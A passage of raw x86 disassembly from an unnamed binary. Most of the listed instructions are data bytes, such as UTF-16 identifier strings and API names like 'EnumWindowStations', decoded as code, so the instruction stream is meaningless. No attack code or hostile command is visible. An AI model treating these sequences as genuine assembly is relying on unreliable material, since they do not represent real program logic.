  42370f:	add    BYTE PTR [eax],bh
  423711:	add    BYTE PTR [edi+0x0],cl
  423714:	inc    ebx
  423715:	add    BYTE PTR ds:0x4d000000,dh
  42371b:	add    BYTE PTR [esi+0x0],cl
  42371e:	inc    ebp
  42371f:	add    BYTE PTR [edi+0x0],bl
  423722:	push   esp
  423723:	add    BYTE PTR [esi+0x0],al
  423726:	cmp    BYTE PTR [eax],al
  423728:	push   ebx
  423729:	add    BYTE PTR [edx+0x0],bl
  42372c:	pop    edi
  42372d:	add    BYTE PTR [eax],dh
  42372f:	add    BYTE PTR [eax],bh
  423731:	add    BYTE PTR [eax+0x0],cl
  423734:	add    BYTE PTR [eax],al
  423736:	dec    esi
  423737:	add    BYTE PTR [edi+0x0],cl
  42373a:	pop    edx
  42373b:	add    BYTE PTR [edi+0x0],bl
  42373e:	add    BYTE PTR ss:[ecx+0x0],bl
  423742:	dec    ebp
  423743:	add    BYTE PTR [esi],dh
  423745:	add    BYTE PTR [ebx],dh
  423747:	add    BYTE PTR [edi+0x0],bl
  42374a:	xor    al,0x0
  42374c:	dec    esi
  42374d:	add    BYTE PTR [edx],dh
  42374f:	add    BYTE PTR [esi],dh
  423751:	add    BYTE PTR [ecx],dh
  423753:	add    BYTE PTR [eax],al
  423755:	add    BYTE PTR [ebx+0x0],cl
  423758:	dec    eax
  423759:	add    BYTE PTR [eax],bh
  42375b:	add    BYTE PTR [edi+0x0],bl
  42375e:	inc    esi
  42375f:	add    BYTE PTR [esi+0x0],al
  423762:	push   esp
  423763:	add    BYTE PTR [edi],dh
  423765:	add    BYTE PTR [esi],dh
  423767:	add    BYTE PTR [edi+0x0],bl
  42376a:	dec    esp
  42376b:	add    BYTE PTR [ecx+0x0],bl
  42376e:	add    BYTE PTR [eax],al
  423770:	push   ebx
  423771:	add    BYTE PTR [ecx+0x0],bl
  423774:	xor    BYTE PTR [eax],al
  423776:	pop    edi
  423777:	add    BYTE PTR [ecx],bh
  423779:	add    BYTE PTR [edx+0x0],dl
  42377c:	dec    eax
  42377d:	add    BYTE PTR [ecx+0x0],bl
  423780:	xor    al,BYTE PTR [eax]
  423782:	pop    edi
  423783:	add    BYTE PTR [eax],dh
  423785:	add    BYTE PTR [eax],al
  423787:	add    BYTE PTR [edx+0x0],al
  42378a:	dec    edx
  42378b:	add    BYTE PTR [esi+0x0],cl
  42378e:	xor    al,BYTE PTR [eax]
  423790:	pop    edi
  423791:	add    BYTE PTR [eax+eax*1+0x33],cl
  423795:	add    BYTE PTR [edx+0x0],dl
  423798:	xor    al,0x0
  42379a:	dec    eax
  42379b:	add    BYTE PTR [eax],al
  42379d:	add    BYTE PTR [ebp+0x0],dl
  4237a0:	add    BYTE PTR ss:[ebp+0x0],cl
  4237a4:	xor    DWORD PTR [eax],eax
  4237a6:	pop    edi
  4237a7:	add    BYTE PTR [esi],dh
  4237a9:	add    BYTE PTR [ecx+0x0],bl
  4237ac:	push   ebp
  4237ad:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4237b1:	add    BYTE PTR [edi+0x0],cl
  4237b4:	inc    esp
  4237b5:	add    BYTE PTR [edi+0x0],dl
  4237b8:	push   ebx
  4237b9:	add    BYTE PTR [eax],al
  4237bb:	add    BYTE PTR [edx+0x0],bl
  4237be:	inc    ebx
  4237bf:	add    BYTE PTR [ebp+0x0],dl
  4237c2:	pop    edi
  4237c3:	add    BYTE PTR [ecx],dh
  4237c5:	add    BYTE PTR [ebp+0x0],al
  4237c8:	push   esp
  4237c9:	add    BYTE PTR [eax],dh
  4237cb:	add    BYTE PTR [eax],al
  4237cd:	add    BYTE PTR [eax],al
  4237cf:	add    BYTE PTR [eax],al
  4237d1:	add    BYTE PTR [eax-0x7ffbffbe],al
  4237d7:	inc    edx
  4237d8:	add    BYTE PTR [eax],cl
  4237da:	add    BYTE PTR [edx+0x0],0xc
  4237de:	add    BYTE PTR [edx+0x0],0x10
  4237e2:	add    BYTE PTR [edx+0x0],0x14
  4237e6:	add    BYTE PTR [edx+0x0],0x18
  4237ea:	add    BYTE PTR [edx+0x0],0x1c
  4237ee:	add    BYTE PTR [edx+0x0],0x20
  4237f2:	add    BYTE PTR [edx+0x0],0x24
  4237f6:	add    BYTE PTR [edx+0x0],0x28
  4237fa:	add    BYTE PTR [edx+0x0],0x0
  4237fe:	add    BYTE PTR [eax],al
  423800:	add    BYTE PTR [eax],al
  423802:	add    BYTE PTR [eax],al
  423804:	xor    ebx,DWORD PTR [edi]
  423806:	ja     0x423855
  423808:	add    BYTE PTR [eax],al
  42380a:	add    BYTE PTR [eax],al
  42380c:	xor    bh,BYTE PTR [eax]
  42380e:	add    al,BYTE PTR [eax]
  423810:	add    DWORD PTR [eax],eax
  423812:	add    BYTE PTR [eax],al
  423814:	add    DWORD PTR [eax],eax
  423816:	add    BYTE PTR [eax],al
  423818:	add    DWORD PTR [eax],eax
  42381a:	add    BYTE PTR [eax],al
  42381c:	sub    BYTE PTR [eax],bh
  42381e:	add    al,BYTE PTR [eax]
  423820:	sub    al,0x38
  423822:	add    al,BYTE PTR [eax]
  423824:	xor    BYTE PTR [eax],bh
  423826:	add    al,BYTE PTR [eax]
  423828:	daa    
  423829:	mov    BYTE PTR [eax],al
  42382b:	add    BYTE PTR [esi],bh
  42382d:	cmp    BYTE PTR [edx],al
  42382f:	add    BYTE PTR [eax],al
  423831:	add    BYTE PTR [edi+0x6f],dl
  423834:	jb     0x42389a
  423836:	push   edi
  423837:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42383e:	aas    
  42383f:	inc    ebp
  423840:	outs   dx,BYTE PTR ds:[esi]
  423841:	jne    0x4238b0
  423843:	push   edi
  423844:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42384b:	popa   
  42384c:	je     0x4238b7
  42384e:	outs   dx,DWORD PTR ds:[esi]
  42384f:	outs   dx,BYTE PTR ds:[esi]
  423850:	jae    0x4238a5
  423852:	je     0x4238b5
  423854:	.byte 0x74
